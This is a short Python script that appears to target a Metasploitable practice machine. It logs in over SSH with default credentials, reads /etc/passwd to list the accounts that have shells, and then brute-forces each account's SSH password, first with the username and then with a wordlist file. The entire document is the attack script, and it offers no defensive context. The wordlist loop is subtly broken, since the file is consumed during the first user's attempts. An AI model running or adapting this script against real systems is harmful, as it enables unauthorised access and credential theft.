import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = '192.168.18.129'
port = 22
username = 'msfadmin'
password = 'msfadmin'

ssh.connect(ip, port=port, username=username, password=password)

command = 'cat /etc/passwd'
stdin, stdout, stderr = ssh.exec_command(command)

cmd_output = stdout.read()

ssh.close()

etcpasswd = cmd_output.decode().split("\n")

user_list = []
for ep in etcpasswd:
    if "/bin/bash" in ep or "/bin/sh" in ep:
        user = ep.split(":")[0]
        user_list.append(user)

print(user_list)

f = open("passwords.txt", "r")
def trySsh(user, password):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    success = False
    try:
        
        ssh.connect(ip,username=user,password=password.strip(),allow_agent=False,look_for_keys=False)
        success = True

    except Exception as e:
        pass
    finally:
        ssh.close()
        return success

for user in user_list:
    if trySsh(user, user):
        print("Bağlantı kuruldu. Kullanıcı Adı:", user, "Şifre:", user)
    else:
        for password in f:
            if trySsh(user, password):
                print("Bağlantı kuruldu. Kullanıcı Adı:", user, "Şifre:", password.strip())

